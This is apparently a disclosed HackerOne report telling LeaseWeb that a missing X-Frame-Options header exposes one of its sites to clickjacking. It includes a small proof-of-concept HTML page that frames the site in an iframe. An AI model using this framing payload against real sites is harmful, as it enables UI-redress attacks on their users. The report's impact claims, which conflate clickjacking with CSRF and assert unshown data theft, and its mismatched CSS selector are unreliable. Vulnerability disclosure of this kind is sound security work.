@@ -1,0 +1,54 @@
+ReportLink:https://hackerone.com/reports/119828
+WeaknessName:UI Redressing (Clickjacking)
+Reporter:https://hackerone.com/9-d
+ReportedTo:LeaseWeb(leaseweb)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:23.03.2016 12:09:45
+
+Summary:
+
+Hello Security,
+Clickjacking (User Interface redress attack, UI redress attack, UI redressing) is a malicious technique of tricking a Web user into clicking on something different from what the user perceives they are clicking on, thus potentially revealing confidential information or taking control of their computer while clicking on seemingly innocuous web pages.
+The server didn't return an X-Frame-Options header which means that this website could be at risk of a clickjacking attack. The X-Frame-Options HTTP response header can be used to indicate whether or not a browser should be allowed to render a page in a <frame> or <iframe>. Sites can use this to avoid clickjacking attacks, by ensuring that their content is not embedded into other sites.
+This vulnerability affects Web Server.
+Impact:
+An attacker can host this domain in other evil site by using iframe and if a user fill the given filed it can directly redirect as logs to attacker and after its redirect to your web server.. its lead to steal user information too and use that host site as phishing of your site its CSRF and Clickjacking
+POC:
+1.open notepad and paste the folloing code
+
+<html><head>
+<title>leaseweb</title>
+<style>
+frame {
+opacity: 0.5;
+border: none;
+position: absolute;
+top: 0px;
+left: 0px;
+z-index: 1000;
+}
+</style>
+</head>
+<body>
+<script>
+window.onbeforeunload = function()
+{
+return " Do you want to leave ?";
+}
+</script>
+<p> site is vulnerable for CSRF!</p>
+<iframe id="frame" width="100%" height="100%" src="http://leasewebnoc.com/"></iframe>
+</body>
+</html>
+2.save it as <anyname>.html eg s.html
+3.and just simply open that..
+As far as i know this data is enough to prove that your site is vulberable to Clickjacking..
+according to OWASP its more than enough..
+https://www.owasp.org/index.php/Testing_for_Clickjacking_(OWASP-CS-004)
+
+Please Fix This Vulnerability AND let me know.
+Looking forward to hear from you.
+Best Regards,
+r4hul
